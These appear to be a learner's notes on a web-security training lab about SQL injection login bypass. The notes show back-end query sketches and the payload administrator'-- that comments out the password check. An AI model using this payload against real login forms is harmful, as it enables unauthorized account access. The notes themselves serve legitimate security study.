# Lab: SQL injection vulnerability allowing login bypass

- sqli: login function
- end goal: use sqli attack and login as administrator user

### Analysis

- URL: `https://0a0e00f304b6997c8134bbb900430058.web-security-academy.net`

- go to login page: `https://0a0e00f304b6997c8134bbb900430058.web-security-academy.net/login`

- back-end:
```sql
select firstname from users where username='administrator' and password='anything'

select firstname from users where username='administrator'' and password='anything'
'-- add single quote follow username is send back 'internal server error'

select firstname from users where username='administrator'--' and password='anything'
-- database interest only username but don't care password 
```

---
